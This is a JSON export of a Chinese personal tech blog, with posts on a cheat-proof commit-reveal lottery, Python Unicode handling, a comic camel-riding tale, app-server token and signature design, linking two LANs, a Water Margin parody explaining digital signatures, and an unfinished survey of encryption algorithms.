[{"title":"怎么科学的组CP","url":"/how-to-combine-couple-in-a-scientific-way/","content":"这个问题来自于一个好友群，大家讨论起组一周CP的事情（就是假装谈恋爱一周），聊到怎么随机分配组合，发现了现在这个问题：有10个男生，10个女生，大家都在网络上没法实际见面，怎么设计一个抽签系统，在组织者本身也不可信的情况下，保证抽签过程无法作弊，而结果尽可能随机。\n\n## 最初方案\n\n1. 组织方写程序跑。这是最初的想法，组织方写个代码，将男女队列随机打乱，编号一样的为一组。组织方公开源码，跑完程序截图。但这个方案不可靠之处在于：a.源码和实际跑的代码不一定一致；b.截图可以修改；\n2. 改进方案是结果图采用gif动态图，保证展示的源码就是实际抽签的代码，且难以P图。但这个方案仍有空挡可钻：整个过程可以跑多次，生成数个gif，然后只给大家展示组织方想要的那个结果。\n3. 直播抽签，开个网络直播，从写代码到最终跑程序抽签全程被监视。这个方案我觉得的确没有空隙可钻了，但成本很高，需要直播整个过程。这就是所谓“中心化”的代价，保证中心可信需要的成本很高。\n\n如果要去掉这个中心（组织者或裁判），改怎么办呢，去中心化有两个思路，一个是借助第三方，第二个是分散变量。\n\n## 第三方方案\n借助第三方其实本质上也仍然有“中心”，但这个第三方如果不涉及利益关系，就比参与者里面挑组织者略为可靠。第三方的思路有几种：\n\n1. 找一个不参与活动且有威望的人作为组织者。这是古老朴素的思路，我们班级选举的班主任，法院的法官其实都类似这种思路。但问题在于第三方的可靠性仍然会受到一些因素的影响：a.第三方和参与者的亲疏关系；b.第三方有可能被贿赂；c.第三方的喜好不同；\n2. 找一个第三方的程序。比如微博抽奖工具，微信红包。微博和微信属于极有公信力的产品，所以这种方案相当于选择了一个社会权威来做第三方。而问题在于：a.微博抽奖和微信红包不是专门针对这件事的，怎么去操作任然需要进一步制定方案; b.微博抽奖需要一个人去操作程序，变相又增加了一个中心。而微信红包没法一次性给出确定结果，效率很低。\n\n## 分散变量方案\n那我们来说今天的重点，分散变量的方案（或者叫分布式），怎么用最小的成本来保证抽签绝对可信度。下面是其中一个方案的思考过程：\n\n1. 变量分散最简单的办法：所有人在群里同时发1-10的数字，如果出现两个人数字相同，则凑一对，剩下人发1-9的数字。如果多人一样则忽略，继续一轮。这个方案的问题很明显：a.低效，很可能好几轮都没法出现一对唯一匹配的；b.有迹可循，可以根据前几轮写的数字看某个人的喜好数字；c.假如有两人要串通，仍然可以作弊。\n2. 变量分散到各个节点后，我们需要设计一个方案来保证任意一个变量都会影响最终结果：将两队人分别编号为0-9，每个人分别出一个1-10的数字，数字之和除以10的余数，该余数编号的人为本轮选出来的人。两组独立进行出两个人匹配为一对。这个方法杜绝了串通作弊的可能，20个数字里任何一个都将影响匹配结果。但仍然有漏洞：有人可以在看到别人出的数字后，快速计算出结果，再最后针对性出数字。即无法保证不同节点的同步。\n3. 解决这个问题，我们可以采用两队单独处理，结果确定后再互相通知，这样即便有人想利用时间差来出数字，也不知道另一队匹配的结果。但这样又增加了一些沟通成本和不透明度，且两队有人串通的话，还是有机会利用上面的漏洞。\n4. 三国演义里，周瑜和诸葛亮手心各自写了一个“火”，然后一起展开手，来说英雄所见略同。这算是一种留存机制，将答案先存到不可更改的地方再公布，可以避免某一方临时变化。如果是在线下，我们可以写在纸上再一起公布，但在线上怎么办呢？怎么确保每个人存的内容不被窥视，且不能更改，且只有一份呢？\n5. 哈希就是一个很好办法，大家统一一种哈希算法，每个人将自己所选数字哈希结果先公布，然后再公布数字本身。由于通过哈希结果无法得到原文，但很容易通过原文来验证哈希，这样就算最终公布不同步，由于哈希已经确定了，也没法再作弊了。\n6. 上面的办法其实还有漏洞，因为1-10的数字的某种哈希算法结果是固定的，有人只要提前计算并记住了这些数字的哈希值，还是可以利用不同步来作弊（这也是现在网上破解MD5的原理）。我们只需要每个人加上一个“特征字”就可以了，每个人的原文为“特征字+数字”，哈希结果就各有不同且没法推测了，最终每个人公布自己的特征字以及数字，其他规则一样，多一个用于校验的特征字。\n\n截止到这一步，我大概构思的一种方案就成型了：AB分两组，分别编号为0-9，\n\n其实看到“去中心化”、“分布式”这样的词时，大家肯定会想到区块链。区块链利用密码学来保证无法抵赖和破坏，同时用分布式来保证计算过程的可靠。我们的问题是去一个随机值，而非计算一个有准确答案的问题，所以没法直接用区块链模型去做。但我们可以将每次的抽签过程里，每个人出的数字和特征字作为按区块链的方式保存起来，下次活动继续在这个链上记载，可以确保将来没有人能否认自己的历史……","tags":["加密"]},{"title":"关于Unicode的知识点及Python中的处理方法","url":"/knowledge-points-of-unicode-in-python/","content":"\n每个用Python的人都肯定为编码头疼过，现在python2和3的str类型又有不同。所以专门写篇博客来记录python里关于Unicode的知识点和处理方法。\n\n## 基础知识点\n\n### 关于Unicode\n \n1. 我们通常意义上说的“字符”，是Unicode字符。\n2. 但计算机存储器里存的是字节序列，中间需要经过一层编码，并不是Unicode字符码位的二进制数据。\n3. Unicode字符包括一个前缀'U+'及字符码位，该码位与操作系统、编码方式无关，是Unicode可以跨平台的原因所在。\n4. Unicode码位是4-6位的16进制数字，但只有10%的码位会有对应字符。\n5. 把码位转换成字节序列的过程是编码(encode)，把字节序列转换成码位的过程是解码(decode)。\n6. 我们通常说的编码是Unicode到字节码的过程，而不是从自然语言到Unicode的过程，某种意义上，我们可以认为Unicode字符是人类可读的。\n7. 字符的存储空间占用与Unicode无关，只和编码方式有关，但是在有的编码方式里，不同的码位字符占用空间可能不同（比如utf-8）。\n8. 原则上，我们无法在不知道编码方式的情况下，将字节码还原成字符。实际上我们可以根据一些特征猜测。\n\n### Python中的字符与Unicode\n1. Python出现的比Unicode标准还早几年，所以你得理解早期别扭的设计。\n2. Python2的str对象是字节序列。\n3. Python3的str对象是Unicode，约等于Python2里面的unicode类型。\n4. Python3里的字节序列类型是bytes，形如b'ab\\xc4'，里面看似有ASCII字符，但实际存储的都是0-255的整数，只是能显示ASCII字符会显示出来。\n5. Python2默认的编码方式是ASCII，Python3是utf-8。\n\n### 关于常见编码方式\n\n1. 最常见的编码方式有这几种：utf-8，utf-16，latin1，除此外还有针对中文的gb2312，微软的cp1252，IBM的cp437，现在几乎没用了，知道一下就行。\n2. 绝地大多数情况下，我们使用的都是utf-8。\n3. utf-16在开头会有形如b'\\xff\\xfeE\\x00l\\x00'的字节序列，是BOM，byte-order mark，字节序标记。大小字节序和CPU有关。使用确定字节序的编码方式UTF-16LE（小字节序），UTF-16BE（大字节序）可以避免出现BOM。\n4. utf-8的优势在于在不同平台的字节序都一致，根本不需要声明字节序，但Windows notepad还是会在utf-8的文件里增加BOM头b'\\xef\\xbb\\xbf'，这很傻逼的处理方式会导致一些问题。\n5. gb2312是过时的中文编码方式，但很多文件（尤其Windows平台的）还会使用，如果中文用utf-8解析不出来，十有八九就是用的gb2312。\n\n## 一些处理办法\n\n###  处理时机\n1. 尽量保证字节码只出现在输入和最终输出的地方，业务逻辑里保证处理的都是unicode字符，可以极大的减少混乱度。\n2. 可以在入口处使用setdefaultencoding来直接改变默认编码方式，如下\n\t```\n\treload(sys)\n\tsys.setdefaultencoding('utf-8')\n\t```\n3. 读取文件后尽早处理为unicode，或者直接开unicode通道。可以使用codecs库来直接开unicode通道，如下 ``file = codecs.open(\"test\", \"r\", \"utf-8\")``\n\n### 特殊情况\n其实编码导致的特殊情况有很多但我多数都忘了，记起来一个来补充一个\n\n1. ``s = '\\u5f20\\u4e09'``形如这种情况，看似是个unicode，实际上s的类型是str，注意前面没有u，所以你继续用常用编码方式encode不会有任何改变，decode的话只会将``\\``转为``\\\\``，结果还是无效，这时候需要的解码方法是``s.decode('unicode_escape')``，可以将unicode码位的字符串转成真正的unicode对象\n\n### unicodedata库\n如果你经常要处理非英文的拉丁语系语言，或者做搜索相关项目，这真是个好用到哭的python内置库。我深有感触。\n\n1. 形如`café`这种带着重音符号的拉丁文词组，想要当成英文处理，可以用unicodedata库的`unicodedata.normalize('NFKD', 'café')`，将重音符号挑出来，然后再去掉特殊符号，从而变成ASCII范围内的英文。\n2. `unicodedata.normalize`第一个参数有4个可选项`NFC/NFD/NFKC/NFKD`，NFC会把重音符合合并到字母上，NFD相反，会拆分出来，NFKC和NFKD同上，但是会做兼容处理。比如符号'μ'会转成希腊字母'μ'，还有二分之一那个符号(\\u00bd)，会被转成1/2。这对于提升搜索体验很有意义。\n3. `unicodedata.name(uchar)`可以显示特殊字符的名称，也可以用`unicodedata.lookup(name)`根据名称找到对应的字符。比如\n```\n>>> name(u'\\u00bd')\n'VULGAR FRACTION ONE HALF'\n```\n4. ``unicodedata.numeric(uchar)``会将内容直接转成对应的数字，比如，这个函数也能将罗马数字、中文数字、中文繁体数字、特殊符号数字都转成标准float类型，如下：\n```\n>>> numeric(u'\\u00bd')\n0.5\n>>> numeric(u'①')\n1.0\n>>> numeric(u'貮')\n2.0\n>>> numeric(u'三')\n3.0\n```\n5. ``unicodedata.category(uchar)``可以区分字符的类型，有以下几种：\n```\nLu（letter，uppercase）：大写字母。 \nLl（letter，lowercase）：小写字母。 \nLt（letter，titlecase）：词首字母大写的字母。 \nLm（letter，modifier）：修饰符字母字符，它是独立式的间距字符，指示前面字母的修改。 \nLo（letter，other）：不属于大写字母、小写字母、词首字母大写或修饰符字母的字母。 \nNd（number，decimal digit）：十进制数字字符，即范围 0 到 9 内的字符。\n```\n\n暂时就这些了，大家有想到的，或者发现的误区欢迎在评论区提出来。\n","tags":["编码"]},{"title":"骆驼轶事","url":"/the-stories-about-camel/","content":"1. 每个对我家乡好奇的朋友，都会跑来问我骑过骆驼没，而我每次都要讲一遍这些故事。所以我决定写下来，下次直接甩给他们看。\n从面向对象的角度来说这叫封装。\n<!--more-->\n2. 小时候我们上学很远，每天一大早我们骑着骆驼带着干粮出发，晚上再骑着回来。平时上课时把骆驼拴在学校旁边的水槽边，下课了都得记得去给加干草。骆驼粪晒干了易燃，可以用来生火，冬天给教室里的炉子生火可比玉米芯和报纸好多了。那时候每个小孩一天轮流一大早给教室生火，快轮到自己时，课间除了给自己的骆驼加草还要捡骆驼粪。\n3. 骆驼总是仰着头一脸轻蔑的甩着嘴巴，即便嘴里没有草也若有若无的嚼着草，就像我们嚼口香糖一样。但这并不代表它生性孤僻，恰恰相反它是认人的。课间休息时有好事的小孩趁着别人家骆驼趴下休息时骑上去，骆驼发现后停下甩动的嘴巴，微微回过头眼睛斜着瞅瞅是谁，若发现是陌生人便猛地挺一下背，小孩来不及反应就嗖的滑下去了。骆驼慢悠悠再趴下来，回过头继续甩嘴巴假装嚼草，嘴角还留着一丝的窃笑。\n4. 双峰的骆驼骑着舒服，但是吃的也多。单峰的吃的少，个子也小，可是不稳当，骑的时候小心会掉下来。据wiki百科说双峰骆驼和单峰骆驼杂交的后代也是单峰，但比父母都要高大，我还从没见过。我家的骆驼是双峰的，而且到现在单峰骆已经很少能见到了。\n5. 有朋友跟我说：听说你们那边是羌人和汉人争夺的地带，上学得带砍马刀。我有点尴尬，毕竟时代发展，解放那么多年了我们不可能还停留在那么原始的阶段。而且骆驼太高，又不够灵活，骑着也不适合打架。有时候那些一边骑着马一边怪叫的少数民族小孩，在我们快放学时堵路上要打架，我们远远看见了，骆驼跑也跑不过马。我们就赶紧下来围成圈，班长拿出二胡拉曲子，大家欢歌笑语。少数民族小孩们过来看见了，忍不住开始跳舞，跳累了又想起原本是来打架的，只好临末撂句狠话：下次再来揍你们，然后骑马回家。所以，小时候竞选班长最重要的是会拉二胡吹笛子。\n6. 又有朋友问我：你现在出来上班是坐飞机还是坐火车？我从家里到北京，先得骑骆驼到县城，然后坐大巴到兰州市，然后再坐飞机到北京，然后坐地铁到我北京的住处，整个过程交通工具跨度很大，十分魔幻。我家离县城比离学校远多了，一大早带上口粮从家里骑骆驼出门，得深夜才能到。但有时候走了三分之一路，口粮就只剩一半了，这样下去势必会挨饿，于是掉头回家补口粮。补完口粮重新出发结果走五分之二路程时天黑了，我怕被羌族人打劫，自己又不会拉二胡吹笛子，只好再次掉头回家。如此往复逾三巡才能到县城。\n这也是为什么我每次请好几天假，但在家只能待一天的原因。\n7. 现在政府管控的逐渐严格了，在乡下骑骆驼还好，在县城和市里骑骆驼需要有骑骆驼执照，无照骑行严重了会被判危害公共安全罪。骆驼驾照也有分类，B照可以骑双峰的，A照可以骑单峰的，S照可以骑杂交的高大单峰骆驼——实际上根本没人会有这种骆驼，这只是制定政策者的强迫症。考试内容无非也是骆驼急转弯，骆驼爬坡，实路考察，当然没有倒库这么烦人的考试，只需要学会栓骆驼就行。理论考试里还包括了骆驼饲养技术。骆驼驾校的教练都是满脸褶子，黝黑皮肤的老头，凶起来莫名其妙的大喊大叫，不仅把我吓的不轻，时常也把骆驼吓的一愣一愣。\n\n说起来，天天写代码，都忘了我的骆驼驾照也快要过期了，哎。","tags":["生活"],"categories":["生活"]},{"title":"App Server接口安全设计思考","url":"/Thinking-on-security-design-of-App-Server-interface/","content":"\n\n上周在设计一个对安全要求很高的移动应用服务时，在接口安全性这块停滞了很久，网上找了许多资料，也问了几个朋友，但始终没找到最完善的解决方案，重点有三：\n\n1. 接口均需身份验证，同一账号不能多个客户端登录。\n2. 通信过程有数据被篡改可能。\n3. 客户端不可信，客户端既可能是受害者，也可能是攻击者。\n\n我们逐一讨论：\n首先，除登录外的接口均不能匿名调用，必须有身份证明，所以必须要有token，当登录验证完账户密码后，生成一个token的键值对，作为之后的身份认证信息。这里有几个点需要注意：\n\n- 不能将完整的token内容传到客户端，应当将token内容存到redis，将key值返回客户端，防止token在客户端被破解和修改内容。\n- key值不能使用纯时间戳，因为当用户量大的时候，很容易被批量扫到key值，所以我们采用10位随机字符串+时间戳的key生成方式，保证key无法被批量扫到。\n- token有效期不能过长，因为token在传输过程中反复出现，假如被抓包得到token值，第三方便能随意伪造客户端身份了。我在这个服务里将token的有效期设为5分钟，超时后需重新申请。 \n- token如何续时，网上有两种常用方案，一种是将账户密码存到客户端，每次超时后自动调用登录接口，这种实现简单，但账户和密码哈希反复在通信过程中传输，增加了被抓取的风险，而且对我们的产品来说，无法保证终端的使用者就是账户拥有者，存在客户端很可能被窃取密码；另一种是增加一个有效期更长的refresh\\_token，用来申请新token用，但这种方案操作起来麻烦一些，需要签名来保证refresh_token不被盗。我最终采用的方案更接近第二种，登录时，记录设备码，之后用设备码当来申请token，当10天没有调用时，该记录失效，需要重新用账户密码登录。\n\n其次通信过程有可能被抓包，被流量劫持，最直接而有效的方案是HTTPS，90%的中间人攻击都可以避免。但\n客户端信任了第三方证书，或者客户端本身尝试通过改数据包绕过APP逻辑时，HTTPS就没有效果了。进一步的保证需要考虑以下几点：\n\n- 采用全文加密还是签名摘要。因为全文加密，无论是对称还是非对称，都需要大量的计算，非常影响运行速度，我们主要是为了防篡改，而非防偷窥，所以选择签名摘要。\n- 采用什么算法。我开始想过RSA签名，但密钥的生成分发会很麻烦，又不能硬编码所有的客户端用同一个密钥对。而哈希就足够保证明文不被篡改了，而且执行速度更快，所以最终决定用SHA256做签名，哈希的盐（密钥）随设备分配。\n- 哈希的盐（密钥），在登录后随设备记录一起生成并返回，客户端之后用这个盐（密钥）与明文一起参与签名。\n- 是否需要增加时间戳参与签名，使用时间戳参与签名的主要目的是防止重放攻击，即第三方抓到数据包后，反复重复发送。我们因为token已经有了时效性，所以大部分接口没必要再增加时间戳参与签名，只有在用机器码申请新token的时候需要加时间戳，来保证不被第三方盗用申请token。\n- 怎么阻止同一账户多设备登录。每次登录后，添加新设备记录并将其他设备的记录更新为停用，之前登录的设备码和密钥失效。\n\n上面提到的第三个重点我们在前面其实已经穿插说过了，直接对接商户的API服务的加密策略和移动应用服务不一样，最大的不同其实也就是第三点。\n\n当然上面假设的大多数情况永远都不会发生，很多数据即便能篡改也不会有实际收益。但我们假设对方完完全全了解我们安全策略的情况下（比如我们中的某开发人员离职了……），怎么杜绝问题出现，也值得讨论。\n\n\n","tags":["加密"],"categories":["安全"]},{"title":"两个局域网怎么互连？一个简单解决方案","url":"/How-to-connect-two-lans/","content":"背景故事这样的：工作室有两条宽带，一条用于同学们日常使用，另一条留给四台服务器专用，两个宽带分别用两个路由器做出口。\n\n现在有几个同学想要远程连服务器，但不在一个内网很麻烦，如果都放在同一个网络，又不希望服务器专用网络的带宽被占用。\n\n所以，问题就成了A, B两个局域网怎么在保证wlan出口不变的情况下，让A局域网内的部分机器能直接访问B局域网内的机器。\n<!--more-->\n\n开始想过用VPN，但从外网绕进来，怎么也觉得别扭。后来又想俩路由器中间加个交换机，弄个trunk接口。\n\n最后突然想明白，这不等同于一个局域网两个wlan口的问题嘛。\n想明白这事，解决方案就很简单了：\n\n1. 两个路由器A和B网线连lan口并联，把lan设置到同一IP段。\n2. 路由器A开DHCP（默认网关指向A本身就行），路由器B关闭DHCP。\n3. 其他同学日常用网用自动获取IP，网关自动就指向A。而服务器手动设置IP，网关指向路由器B。\n4. 这样就实现两个网络互通，且出口不同了。\n5. 最后在路由器A上添加访问规则，限制只能有部分同学的MAC地址可以访问服务器所在的IP范围。\n\n其实用一个双wlan口的路由器也能解决这个问题，只是后续再有变更可能没俩路由器那么灵活。\n第三步如果服务器量大了手动设置就很麻烦，需要用静态DHCP+路由规则去做。\n\n\n\n\n","tags":["局域网"],"categories":["杂谈"]},{"title":"梁山神算子算天机 江州黄通判通地孤","url":"/entertain-cryptography/","content":"话说当年宋江在江州浔阳楼题了反诗，被江州知府蔡九关押在死牢。蔡九依黄文炳之计，写家书给父亲蔡京，以炫耀“抓获反贼”之功，并让蔡京指点如何处置宋江。\n\n岂料戴宗中途被朱贵药酒迷倒，被同家书一并递与梁山。晁天王听完宋江在牢中心急火燎，定是要带着头领们打入死牢解救宋江，军师吴用却阻拦道：哥哥莫急，此事不可力敌，只能智取—— 我等将计就计，写一封假回书，让戴院长带回去，书上只说教把犯人宋江解赴东京再处决示众，待他来此间经过我们夺了便是。\n<!--more-->\n晁盖道：好是好，只是没人会蔡京笔迹，又没蔡京图章。吴用说有圣手书生萧让可写蔡京字迹，玉臂匠金大坚可刻图章。诸位好汉无不称妙之时，忽闻一声且慢，原来是神算子蒋敬，蒋敬上前道：军师且慢，请细看此家书封底。\n\n众人凑近细看，发现有两行蝇头小字，上书“七四八六九零八八七二三一九三”，下书“四六七三二九七五三”。\n\n晁盖吴用不解，问道：先生这是何意？\n\n蒋敬道：此乃“数章”，用以验明书者正身，文未篡改。\n\n吴用道：寥寥二十余字如何验得，还请先生赐教。\n\n蒋敬在地上画道：此书有两百余字，取首字“今”，得其笔数为四，记于纸上，次字为“有”，其笔数为六，四六得二四，取第二四字，得其笔数为七，记于纸上，七再乘第二五字笔数，再记所的字笔数，若超总字数，则从首再计，如此往复九循，可得“散列”，又名“土法哈希”，若此数无异，可保文未篡改。\n\n吴用叹服之余，又道：今先生既已得“土法哈希”之术，我等效之算出“散列”，书与家书封后，岂不万全？\n\n蒋敬道：军师且听我言，这两行字上面是“数签”，下面则是“数密”。古人云，数若三，七，十三，十七，十九者，除以非一之数，皆无穷尽，谓曰“孤数”。蔡九藏一孤数，名天孤，蔡京写信前新取一孤数，名地孤。天孤乘地孤之积，为数密，又名“土法土法阿爱斯爱”。蔡京以地孤乘“散列”，可得“数签”，“数签”、“数密”记于家书封底，待蔡九收到时以“数密”除以天孤，可得地孤，以验“数签”，可知此书真假。蔡九回书，亦是如此。\n\n晁盖忙道：如今我等既知“数密”，令梁山数百识得数的兄弟分头去算，不过半日，岂不得天孤地孤？\n\n蒋敬叹气道：哥哥所不知啊，由天孤地孤得数密只需三个时辰，可要从数密得天地孤，用尽天下算筹算到黄天更替也不一定算出来啊。\n晁盖林冲等一帮头领顿足叹气时，吴用道：我有一计，可破此“数签”，令鼓上骚时迁去蔡九府上，盗一封旧家书，假回书只要字数一致，关键字照用旧家书的字，其他内容遣词填补，更替语义，便可不知天地孤亦能造假。\n晁盖蒋敬拍手称秒：军师不愧为智多星！当下吩咐首领们去做。\n\n话说戴宗扣着日期，回了江州，当厅下了回书，蔡九见戴宗如期归来，好生欢喜，令下人算了地孤，验了数签，心里踏实了。过了两日，临要押送宋江出发时，门子来报“无为军黄通判前来特探”，蔡九将回书给黄文炳看了一番，黄文炳看行文古怪，心有疑虑，又亲自算了一遍地孤和数签。卷过来一看，又见封面新鲜，摇头道：这份回书是假的。\n\n知府到：通判差矣，此是家尊亲笔手迹，又有数签可证，怎会是假的。\n黄文炳道：我方才又算，得地孤是“六一五一九”，蔡权相府上选地孤，几月便选几开头的地孤，如今九月，此地回书必定是盗用旧文书伪造而成，此乃“时密不符“。\n\n蔡九一惊，急忙唤回戴宗，盘问之下，戴宗不能对答。随即将戴宗一并打入死牢，等候处斩。\n\n\n---\n注解\n- 数章：数字签名，数字签名通过摘要和加密算法来保证原文的真实性。文中的数字签名(数章)分成了两部分，第一行是加密后的摘要内容(数签)，第二行是加密采用的公钥(数密)。\n- 土法哈希：Hash，散列函数。实际散列函数计算方式很复杂，文中所写的通过笔画和字的位置算摘要的方法非常简陋，只能保证确定性，却不具备唯一性，很容易出现散列冲突(或者叫哈希碰撞)，文中吴用在后面发现了这个特性，并利用哈希碰撞一定程度上破解了这个算法。我们常见的MD5和SHA1等都属于Hash算法，MD5和SHA实际上也存在哈希碰撞(Collision)的可能，王小云教授破解MD5正是利用了这个原理。\n- 土法阿爱斯爱：RSA，目前最著名的非对称加密算法，RSA算法的核心是极大整数的因数分解和欧拉定律。文中的加密方法只是单纯的利用了大整数难以分解因数的特性，实际上RSA的计算过程和秘钥长度都复杂很多。\n- 孤数：素数/质数，中国古代数学其实并没有素数这个概念。\n- 天孤：用来当私钥的大素数。\n- 地孤：用来实际和哈希值参与计算的素数。\n- 时密不符：时间戳不匹配。在数字签名里加上时间戳可以防止重放攻击，保证信息的时效性。文中蔡京指定发信月份和素数首位匹配，能简单的保证信件时效性，也弥补了哈希算法过于简单导致的被碰撞的漏洞。黄文炳最终靠这一点发现了信件是伪造的。\n\n这篇故事新编是我几个月前某天晚上一时兴起发在朋友圈里的，换了种方式给大家科普加密算法。\n但为了故事氛围和易于理解，将概念都简化了，到底还是戏说。各位有兴趣可以去网上再找资料进一步了解。","tags":["加密"],"categories":["安全"]},{"title":"常见加密算法简介","url":"/common-encryption-algorithm-introduction/","content":"## 一、对称加密 对称密钥（Symmetric-key cryptography）\n---\n### 概述\n对称加密是指加解密用同一个密钥的算法，根据具体实现分为流加密和分组加密两种类型：\n\n- 流加密（Stream cipher）是对称加密常用的一种实现方法，加密和解密双方使用相同伪随机加密数据流，一般都是逐位异或随机密码本的内容。\n\n- 分组加密加密（Block cipher），也叫块加密，将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。现代分组加密建立在迭代的思想上产生密文。迭代产生的密文在每一轮加密中使用不同的子密钥，而子密钥生成自原始密钥。\n\n对称加密普遍比非对称加密速度要快，实现更简单，适合大量内容的加密\n<!--more-->\n\n### DES (Data Encryption Standard)\nDES是一种分组加密算法\n\nDES算法的入口参数有三个:Key,Data,Mode，Key是密钥密钥占7个字节56位（64位里另外8位是用来校验的），Data是加密内容，占8个字节64位，Mode是加密还是解密。\n\nDES算法于1976被确定，现在已经被认为不够安全，主要原因是56位的密钥过短。据说这个算法因为包含一些机密设计元素，被怀疑内含美国国家安全局（NSA）的后门。\n\nDES算法有个拓展算法叫3DES，就是对数据块进行三次DES加密，增加爆破成本，但本质上也不够安全。\n\n### RC4 (Rivest Cipher 4)\nRC4是一种流加密算法\n\nRC4起源于1987年，现在已经被认为不够安全。\nRC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。\n\n由于异或运算的对合性，RC4加密解密使用同一套算法。这个算法实现起来很简单，只用了最基本的加、异或、循环，话说我大学时某个课程设计的做的加密算法就是简化版的RC4。\n\n之后还出现了RC5、RC6加密算法，但RC5和RC6都是分组加密，和RC4原理并不一样。\n\n\n### RC5（Rivest Cipher 5）\nRC5是一种分组加密算法，它和RC2，RC4，RC6都是同一个叫Ronald Rivest的人设计的。\n\n相比RC4，RC5的密钥成了128位，但RC5仍然只需要基础的加、异或、循环运算，可以在很多硬件上实现。RC5有三个参数：字的大小，循环轮数（round），密钥中的8位字节个数，所以可以说RC5是一种可变加密算法。实际上循环轮数12轮以下的RC5都被认为是不安全的，会被差分分析法（Differential cryptanalysis）攻击，18-20轮才足够安全。\n\n目前来说，RC5还是挺安全的，因为实现简单，消耗资源少，在一些传感器、嵌入式设备上使用很合适。\n\n### RC6（Rivest Cipher 6）\nRC6是RC5的加强版，也属于分组加密算法。\n\nRC6算法在RC5算法基础之上针对RC5算法中的漏洞，主要是循环移位的位移量并不取决于要移动次数的所有比特，通过采用引入乘法运算来决定循环移位次数的方法，对RC5算法进行了改进，从而大大提高了RC6算法的安全性。\n\nRC6曾作为AES（高级加密标准）备选算法之一，但最终AES选择了Rijndael算法。\n\n### AES (Rijndael)\n\n最后压轴出场的是最著名的单密钥对称加密算法AES，AES是Advanced Encryption Standard的缩写，是美国国家标准与技术研究院2001年发布的新加密标准。\nAES现在就是指的限定了区块长度和密钥长度的Rijndael算法，同样属于分组加密算法，该算法是两位比利时学者1998年发布的。起初还有很多算法参与了AES甄选，最终Rijndael凭借高安全性和清晰的数学结构而被选用。\nAES将Rijndael算法的区块长度固定为128位，密钥长度可选128，192或256比特（Rijndael原版支持128-256，n*32的区块长度和密钥长度）。\n\nAES算法包括4个步骤：\n\n1. AddRoundKey—矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。\n2. SubBytes—通过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。\n3. ShiftRows—将矩阵中的每个横列进行循环式移位。\n4. MixColumns—为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey替换。\n\n截止现在（2016），AES在算法层面上是安全的。2005年有人公布过一种缓存时序攻击法，但使用场景非常极端。\n\n### 未完 其他待补充\n\n## 二、非对称加密 公钥加密（Asymmetric key cryptography）\n---\n### 概述\n公钥加密的思想于1974年被提出，相比对称加密无需共享密钥，更加安全。但是没法加密大量数据，一般用来加密对称加密的密钥，而用对称加密加密大量数据。\n非对称加密的原理如下：\n\n1. 消息发送方A在本地构建密钥对，公钥和私钥；\n2. 消息发送方A将产生的公钥发送给消息接收方B；\n3. B向A发送数据时，通过公钥进行加密，A接收到数据后通过私钥进行解密，完成一次通信；\n4. 反之，A向B发送数据时，通过私钥对数据进行加密，B接收到数据后通过公钥进行解密。\n\n### RSA\n\nRSA算法是最著名的非对称加密算法。RSA是1977年提出的，名字来源于Rivest、Shmir和Adleman三位作者。\n我们平时用到的SSL协议，TLS协议都采用了该算法加密，SSH（Secure Shell）也是基于RSA实现的。\n\nRSA的数学基础是极大整数的因数分解，具体实现过程如下：\n\n1. 随意选择两个大的质数p和q，p不等于q，计算N=pq。\n2. 根据欧拉函数，求得r=varphi (N) = varphi(p) * varphi(q)=(p-1)(q-1)\n3. 选择一个小于r的整数e，使e与r互质。并求得e关于r的模反元素，命名为d。\n4. (N,e)是公钥，(N,d)是私钥。\n5. 加密时，加密的块 n^e ≡ c(MOD N)，得到的c就是密文。解密时，c^d ≡ n(MOD N)。\n\n要破解RSA要解决怎么把一个极大数分解为两个质数p和q，然后通过欧拉函数再得到公钥和私钥。但极大数因数分解目前还没什么好办法，所以只要N足够大，RSA在算法层面上就是安全的。\n\n当N的长度为256时，用普通电脑花几小时即可以分解，当N长度为512时需要花数月时间分解，1024时需要大型分布式系统才能分解，长度到2046则可以确保是完全安全的。目前已有记录里，被分解的极大数最大位数是768位，于2009年被分解。\n\nRSA也常被用来做数字签名，在消息内附加一个私钥加密过的散列值（Message digest），以此来确保消息发送人是可靠的。\n\n### 椭圆曲线算法（Elliptic curve cryptography）\n\n椭圆曲线算法也是一种非对称加密算法，于1985年被提出，以下简称ECC。\n相比RSA，同等破解难度时ECC的秘钥更短。另外，ECC可定义椭圆曲线群的双线性映射，该特性可能将来被用来实现身份基加密体制（Identity-Based Encryption，IBE）。\n\nECC的数学基础是求椭圆曲线离散对数问题。实现比较复杂我就不写了，因为我也看不懂(⊙﹏⊙)b。 也正因为实现复杂，ECC的加解密速度慢，消耗资源也更多。\n\nECC也同样可以实现数字签名，叫做ECDSA。\n\nECC的秘钥长度最小要求是160位，建议是163位。目前已有的破解记录是109位，一万台机器破解了一年半。所以ECC在算法层面是可以保证安全的。\n\n### ElGamal\n\nElGamal加密算法是一种用于对采用Diff-Hellman方式进行交换的公钥进行加密，常被用于数字签名和密钥加密的算法，ElGamal的数学基础是有限域上的离散对数问题。\n\n选择一个素数p和两个随机数g 、x （g、 x < p ），计算 y ≡ g^x（ mod p ） ，则其公钥为 y, g 和p ，私钥是x ，g和p可由一组用户共享。\n\nElGamal方法中一个明文对应两个加密结果(g^a和g^b)，因此密文空间的大小是明文空间大小的两倍，也就是说纵观整个通信过程，收发密文的大小是实际明文大小的两倍。\n\n### 待补充\n\n\n## 三、哈希算法\n---\n### 概述\n我们经常说MD5加密，但追根究底的话，MD5应该是哈希函数（Hash Function），而哈希函数并不等同于加密（Encrypt），不过我们平常也把哈希叫做加密。哈希函数也叫散列函数，散列函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫做散列值（hash values，hash codes，hash sums，或hashes）的指纹。散列值通常用来代表一个短的随机字母和数字组成的字符串。\n\n说人话就是哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串，而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。\n\n哈希主要用来校验身份，错误检查，完整性检查。\n\n### MD5（Message-Digest5 